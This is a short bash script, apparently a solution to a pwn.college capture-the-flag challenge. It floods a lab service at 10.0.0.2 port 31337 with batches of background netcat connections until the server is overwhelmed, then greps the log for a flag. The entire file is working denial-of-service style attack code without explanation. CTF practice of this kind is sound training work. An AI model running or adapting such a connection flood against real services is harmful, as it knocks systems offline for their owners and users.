#!/bin/bash
# flag_capture.sh

# Conservative settings that worked
BATCH=25
DELAY=0.15
MAX=35

cleanup() {
  echo "=== Checking for flags ==="
  grep -o "pwn.college{.*}" flood.log 2>/dev/null || echo "Check error logs manually"
  exit
}
trap cleanup SIGINT

while true; do
  for i in $(seq 1 $BATCH); do
    echo "GET_FLAG_$i" | timeout 1 nc -w 1 10.0.0.2 31337 >> flood.log 2>&1 &
    sleep 0.01
  done
  
  echo "[+] Batch of $BATCH sent (Total ~$(pgrep -c 'nc 10.0.0.2 31337'))"
  
  # Test server availability
  if ! echo "PROBE" | timeout 1 nc -w 1 10.0.0.2 31337 2>/dev/null; then
    echo "[!] Server overwhelmed - checking for flag"
    grep -o "flag{.*}" flood.log | head -1 && exit
    sleep 2
  fi
  
  sleep $DELAY
done
